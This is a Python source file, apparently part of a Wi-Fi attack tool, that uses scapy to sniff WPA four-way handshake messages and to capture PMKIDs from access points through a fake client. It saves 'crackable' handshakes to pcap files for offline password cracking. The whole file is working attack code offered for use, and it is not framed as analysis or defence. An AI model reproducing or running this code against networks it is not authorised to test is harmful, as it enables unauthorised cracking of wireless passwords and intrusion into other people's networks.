import time

from contextlib import contextmanager
from threading import Thread, Event

from scapy.all import sniff, wrpcap
from scapy.layers.dot11 import Dot11Beacon, Dot11AssoResp
from scapy.layers.eap import EAPOL
from scapy.packet import Packet

from constants import BROADCAST, EAPOL_MIC_BIT, EAPOL_SECURE_BIT


def get_eapol_message_type(eapol_payload, bssid, mac2):
    key_info = int.from_bytes(eapol_payload[5:7], byteorder='big') 
    is_ap_to_client = (mac2 == bssid)

    # ap -> client vs client -> ap
    if is_ap_to_client:
        if not (key_info & EAPOL_MIC_BIT):
            return 'M1'
        else:
            return 'M3'
    else:
        if not (key_info & EAPOL_SECURE_BIT):
            return 'M2'
        else:
            return 'M4'


@contextmanager
def capture_handshakes(interface, bssid, channel, handshake_limit=None, timeout=60, outfile='temp.pcap'):
    handshakes = {}
    captured_packets = []
    got_beacon = False

    stop_event = Event()

    def is_stopped(packet: Packet):
        return stop_event.is_set()
    
    def check_completed():
        if not got_beacon or handshake_limit is None:
            return
            
        crackable_count = 0
        for msgs in handshakes.values():
            if (msgs['M1'] and msgs['M2']) or (msgs['M2'] and msgs['M3']):
                crackable_count += 1
                
        if crackable_count >= handshake_limit:
            print(f'\n({interface}) SUCCESS: Captured {crackable_count} required crackable handshake(s).')
            stop_event.set()
    
    def packet_handler(packet: Packet):
        nonlocal got_beacon

        # put into function?
        if not got_beacon and packet.haslayer(Dot11Beacon) and packet.addr3 == bssid:
            captured_packets.append(packet)
            got_beacon = True
            check_completed()
            return

        if not packet.haslayer(EAPOL):
            return

        mac1, mac2 = packet.addr1, packet.addr2
        if bssid not in [mac1, mac2]:
            return
        
        client_mac = mac1 if mac2 == bssid else mac2
        if client_mac == BROADCAST:
            return
        
        if client_mac not in handshakes:
            handshakes[client_mac] = {'M1': False, 'M2': False, 'M3': False, 'M4': False}

        eapol_payload = bytes(packet[EAPOL])
        if len(eapol_payload) < 7:
            return
        
        message_type = get_eapol_message_type(eapol_payload, bssid, mac2)
        if handshakes[client_mac][message_type]:  # we already have this EAPOL message
            return
        
        handshakes[client_mac][message_type] = True
        captured_packets.append(packet)
        
        status = ' | '.join(f"{k}: {'Y' if v else 'N'}" for k, v in handshakes[client_mac].items())
        print(f'({interface}) Caught {message_type} for {client_mac} -> [{status}]')

        check_completed()


    sniffer_thread = Thread(
        target=sniff,
        kwargs={
            'iface': interface,
            'prn': packet_handler,
            'stop_filter': is_stopped,
            'store': False
        },
        daemon=True
    )

    sniffer_thread.start()
    print(f'({interface}) Capturing handshakes on network {bssid}...')

    def wait_for_finish():
        try:
            stop_event.wait(timeout)
        except KeyboardInterrupt:
            pass

    try:
        yield handshakes, wait_for_finish

    finally:
        stop_event.set()
        sniffer_thread.join()

        if len(captured_packets) > 1:
            wrpcap(outfile, captured_packets)
            print(f'\n({interface}) Capturing handshakes finished. Saved to {outfile}')
        else:
            print(f'\n({interface}) Capturing handshakes finished. No handshakes captured.')


@contextmanager
def capture_pmkid(interface, bssid, client_mac, channel, timeout=10, outfile='pmkid.pcap'):
    captured_packets = []
    status = {'beacon': False, 'assoc_resp': False, 'pmkid': False}

    stop_event = Event()

    def is_stopped(packet: Packet):
        return stop_event.is_set()
    
    def packet_handler(packet: Packet):
        if not status['beacon'] and packet.haslayer(Dot11Beacon) and packet.addr3 == bssid:
            captured_packets.append(packet)
            status['beacon'] = True
            return

        if not status['assoc_resp'] and packet.haslayer(Dot11AssoResp):
            if packet.addr2 == bssid and packet.addr1 == client_mac:
                captured_packets.append(packet)
                status['assoc_resp'] = True
                print(f'\n({interface}) AP accepted fake client! Caught association response.')
                return

        if packet.haslayer(EAPOL):
            if packet.addr2 == bssid and packet.addr1 == client_mac:
                eapol_payload = bytes(packet[EAPOL])
                
                pmkid_signature = b'\x00\x0f\xac\x04'   
                
                if pmkid_signature in eapol_payload:
                    captured_packets.append(packet)
                    status['pmkid'] = True
                    print(f'({interface}) SUCCESS: Caught EAPOL M1 containing PMKID!')
                    stop_event.set()
                else:
                    print(f'({interface}) Caught M1, but no PMKID found. Target likely not vulnerable.')
                    stop_event.set()

    sniffer_thread = Thread(
        target=sniff,
        kwargs={
            'iface': interface,
            'prn': packet_handler,
            'stop_filter': is_stopped,
            'store': False
        },
        daemon=True
    )

    sniffer_thread.start()
    time.sleep(1)
    print(f'\n({interface}) Capturing PMKID on network {bssid} for fake client {client_mac}...')

    def wait_for_finish():
        try:
            stop_event.wait(timeout)
        except KeyboardInterrupt:
            pass

    try:
        yield status, wait_for_finish

    finally:
        stop_event.set()
        sniffer_thread.join()

        if status['pmkid']:
            wrpcap(outfile, captured_packets)
            print(f'\n({interface}) PMKID capture finished. Saved to {outfile}')
        else:
            print(f'\n({interface}) PMKID capture finished. Attack failed or timed out.')
